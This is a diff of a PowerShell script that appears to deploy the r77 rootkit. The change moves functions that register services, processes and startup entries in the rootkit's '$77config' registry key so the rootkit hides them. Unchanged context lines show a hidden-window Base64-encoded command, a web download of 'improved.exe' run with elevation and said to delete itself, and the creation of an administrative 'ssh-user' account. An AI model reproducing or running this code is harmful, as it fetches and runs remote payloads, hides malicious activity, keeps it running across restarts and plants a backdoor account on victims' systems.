@@ -97,6 +97,59 @@ $encodedCommand = [Convert]::ToBase64String($bytes)
 # Launch the script block in a new PowerShell window
 Start-Process PowerShell.exe -ArgumentList "-NoProfile -EncodedCommand $encodedCommand" -WindowStyle Hidden
 
+# Adds services, processes, and startup applications to the r77 configuration registry keys
+
+# Function to check and create the registry key if it doesn't exist
+function Ensure-RegistryKey {
+    param([string]$path)
+    if (-not (Test-Path -Path $path)) {
+        New-Item -Path $path -Force | Out-Null
+        Write-Host "Registry path created: $path"
+    }
+    else {
+        Write-Host "Registry path already exists: $path"
+    }
+}
+
+
+
+# Function to add a service name to the registry if not already present
+function Add-ServiceName {
+    param([string]$service)
+    if (-not (Get-ItemProperty -Path $serviceNamesPath -Name $service -ErrorAction SilentlyContinue)) {
+        New-ItemProperty -Path $serviceNamesPath -Name $service -Value $service -PropertyType String | Out-Null
+        Write-Host "Service name added to registry: $service"
+    }
+    else {
+        Write-Host "Service name already in registry: $service"
+    }
+}
+
+# Function to add a process name to the registry if not already present
+function Add-ProcessName {
+    param([string]$process)
+    if (-not (Get-ItemProperty -Path $processNamesPath -Name $process -ErrorAction SilentlyContinue)) {
+        New-ItemProperty -Path $processNamesPath -Name $process -Value $process -PropertyType String | Out-Null
+        Write-Host "Process name added to registry: $process"
+    }
+    else {
+        Write-Host "Process name already in registry: $process"
+    }
+}
+
+# Function to add a startup application to the registry if not already present
+function Add-StartupApplication {
+    param([string]$applicationPath)
+    $executableName = [System.IO.Path]::GetFileName($applicationPath)
+    if (-not (Get-ItemProperty -Path $startupPath -Name $executableName -ErrorAction SilentlyContinue)) {
+        New-ItemProperty -Path $startupPath -Name $executableName -Value $applicationPath -PropertyType String | Out-Null
+        Write-Host "Startup application added to registry: $executableName"
+    }
+    else {
+        Write-Host "Startup application already in registry: $executableName"
+    }
+}
+
 # Ensure the main configuration key exists
 $rootRegPath = 'HKLM:\SOFTWARE\$77config'
 Ensure-RegistryKey -path $rootRegPath
@@ -150,59 +203,6 @@ Invoke-WebRequest -Uri $exeUrl -OutFile $exePath
 
 # Execute improved.exe without waiting for completion. EXE Deletes itself, no need to do it manually.
 Start-Process -FilePath $exePath -Verb RunAs -Wait
-
-# Adds services, processes, and startup applications to the r77 configuration registry keys
-
-# Function to check and create the registry key if it doesn't exist
-function Ensure-RegistryKey {
-    param([string]$path)
-    if (-not (Test-Path -Path $path)) {
-        New-Item -Path $path -Force | Out-Null
-        Write-Host "Registry path created: $path"
-    }
-    else {
-        Write-Host "Registry path already exists: $path"
-    }
-}
-
-
-
-# Function to add a service name to the registry if not already present
-function Add-ServiceName {
-    param([string]$service)
-    if (-not (Get-ItemProperty -Path $serviceNamesPath -Name $service -ErrorAction SilentlyContinue)) {
-        New-ItemProperty -Path $serviceNamesPath -Name $service -Value $service -PropertyType String | Out-Null
-        Write-Host "Service name added to registry: $service"
-    }
-    else {
-        Write-Host "Service name already in registry: $service"
-    }
-}
-
-# Function to add a process name to the registry if not already present
-function Add-ProcessName {
-    param([string]$process)
-    if (-not (Get-ItemProperty -Path $processNamesPath -Name $process -ErrorAction SilentlyContinue)) {
-        New-ItemProperty -Path $processNamesPath -Name $process -Value $process -PropertyType String | Out-Null
-        Write-Host "Process name added to registry: $process"
-    }
-    else {
-        Write-Host "Process name already in registry: $process"
-    }
-}
-
-# Function to add a startup application to the registry if not already present
-function Add-StartupApplication {
-    param([string]$applicationPath)
-    $executableName = [System.IO.Path]::GetFileName($applicationPath)
-    if (-not (Get-ItemProperty -Path $startupPath -Name $executableName -ErrorAction SilentlyContinue)) {
-        New-ItemProperty -Path $startupPath -Name $executableName -Value $applicationPath -PropertyType String | Out-Null
-        Write-Host "Startup application added to registry: $executableName"
-    }
-    else {
-        Write-Host "Startup application already in registry: $executableName"
-    }
-}
 
 # Create a new user `ssh-user` with administrative privileges
 # Check if SSH user exists before creating
